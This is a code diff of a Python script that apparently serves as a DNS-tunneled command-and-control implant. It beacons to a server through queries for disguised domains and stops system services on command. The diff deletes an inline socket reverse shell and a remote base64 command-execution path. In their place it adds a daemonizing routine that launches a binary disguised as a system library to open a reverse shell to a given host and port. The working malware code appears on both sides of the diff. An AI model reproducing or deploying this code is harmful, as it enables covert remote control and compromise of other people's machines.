@@ -1,28 +1,19 @@
 #!/usr/bin/env python3
-global SERVER; SERVER = ''
 import socket
 import struct
+import sys
 import time
 import os
 
 WAIT_TIME = 10
 
-def startReverseShell(HOST, PORT):
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, int(PORT)))
-        while True:
-            cmd = s.recv(1024).decode().strip()
-            if not cmd or cmd.lower() == "exit":
-                break
-            try:
-                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-            except subprocess.CalledProcessError as e:
-                output = e.output
-            if len(output) == 0:
-                output = b' ' #avoid sending empty response which can cause client to hang
-            s.send(output)
+if (len(sys.argv) != 2):
+    print("Usage: server.py {ip to send to}")
+    exit
+else:
+    SERVER = sys.argv[1]
 
-def makeQuery(address):
+def makeQuery(address, recordType='A'):
     query = b'\x12\x34'  # Transaction ID
     query += b'\x01\x00'  # Flags
     query += b'\x00\x01'  # QDCOUNT
@@ -40,7 +31,7 @@ def makeQuery(address):
     query += b'\x00\x01'  # QCLASS (IN)
     return query
 
-def getResponse(data, recordType='ANY'):
+def getResponse(data, recordType='A'):
     answers = []
     try:
         header = data[:12]
@@ -48,53 +39,39 @@ def getResponse(data, recordType='ANY'):
         ancount = struct.unpack("!H", header[6:8])[0]
         offset = 12
 
-        # Skip question section
+        # Skip over the query section
         for _ in range(qdcount):
             while data[offset] != 0:
                 offset += data[offset] + 1
-            offset += 5  # 0 + QTYPE(2) + QCLASS(2)
+            offset += 5  # null byte + QTYPE(2) + QCLASS(2)
 
-        # Answer section
+        # Now at the start of answer section
         for _ in range(ancount):
+            # Skip NAME (2 bytes pointer) + TYPE(2) + CLASS(2) + TTL(4) + RDLENGTH(2)
             if offset + 12 > len(data):
                 break
-
             rtype = struct.unpack("!H", data[offset+2:offset+4])[0]
             rdlength = struct.unpack("!H", data[offset+10:offset+12])[0]
             offset += 12
-
-            rdata = data[offset:offset+rdlength]
-
-            if rtype == 16:  # TXT
-                txtData = b""
-                rdOffset = 0
-                while rdOffset < rdlength:
-                    if rdOffset + 1 > rdlength:
-                        break
-                    length = rdata[rdOffset]
-                    rdOffset += 1
-                    if rdOffset + length > rdlength:
-                        break
-                    txtData += rdata[rdOffset:rdOffset+length]
-                    rdOffset += length
-
-                if recordType.upper() == 'TXT' or recordType.upper() == 'ANY':
+            if recordType.upper() == 'TXT':
+                if rtype == 16:  # TXT record
+                    # TXT records have length-prefixed strings
+                    txtData = b''
+                    rdOffset = 0
+                    while rdOffset < rdlength:
+                        length = data[offset + rdOffset]
+                        rdOffset += 1
+                        txtData += data[offset + rdOffset:offset + rdOffset + length]
+                        rdOffset += length
                     answers.append(txtData.decode('utf-8', errors='ignore'))
-
-            elif rtype == 1 and rdlength == 4:  # A
-                if recordType.upper() == 'A' or recordType.upper() == 'ANY':
-                    ip = ".".join(str(b) for b in rdata[:4])
+            else:
+                if rtype == 1 and rdlength == 4:  # A record
+                    ip = ".".join(str(b) for b in data[offset:offset+4])
                     answers.append(ip)
-
             offset += rdlength
-
     except Exception as e:
         print("Parsing error:", e)
-
     return answers
-
-def from_base64(b64: str) -> str:
-    return base64.b64decode(b64.encode("ascii")).decode("ascii")
 
 def formSocket():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -116,8 +93,43 @@ def resolveFileName(ips):
     return fileName
     
 def spawnRevShell(host, port):
-    thread = threading.Thread(target=startReverseShell, args=(host, port))
-    thread.start()
+    pid = os.fork()
+    if pid > 0:
+        # Parent returns immediately; 'pid' is the first child's PID (not the final worker)
+        sys.stdout.write("Spawned intermediate PID %d\n" % pid)
+        return pid
+
+    # First child
+    os.setsid()          # new session, detach from TTY
+    pid2 = os.fork()
+    if pid2 > 0:
+        # First child exits; grandchild gets re-parented to init/systemd
+        os._exit(0)
+
+    # Grandchild: become the daemonized worker
+    try:
+        os.chdir("/")
+        os.umask(0)
+
+        # Close inherited FDs (except stdio). Redirect stdio to /dev/null.
+        try:
+            maxfd = os.sysconf("SC_OPEN_MAX")
+        except (AttributeError, ValueError):
+            maxfd = 256
+        for fd in range(3, maxfd):
+            try: os.close(fd)
+            except OSError: pass
+
+        devnull = os.open("/dev/null", os.O_RDWR)
+        os.dup2(devnull, 0)
+        os.dup2(devnull, 1)
+        os.dup2(devnull, 2)
+
+        cmd = ("/usr/lib64/libcpu.so", host, port)
+        os.execvp(cmd[0], cmd)
+    except Exception as e:
+        os.write(2, ("exec failed: %s\n" % e).encode("utf-8"))
+        os._exit(127)
 
 sock = formSocket()
 sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
@@ -197,21 +209,5 @@ while True:
                     
                 print("Stopping service: " + serviceName)
                 os.system("systemctl stop " + serviceName)
-            elif(ipSplit[1] == "65"):
-                print("Collecting command to run")
-                
-                sock.sendto(makeQuery("remotehelp.com"), (SERVER, 53)) #Single IP ending in .100 signals an error, stop process and sleep
-                resp, _ = sock.recvfrom(512)
-
-                data = getResponse(resp)
-                
-                if len(data) == 1 and len(data[0].split('.')) == 4:
-                    if data[0].split('.')[3] == "100":
-                        continue #Error response, skip running command
-                else:
-                    command = from_base64(data[0])
-                    
-                #print("Running command: " + command)
-                os.system(command)
                 
     time.sleep(WAIT_TIME)
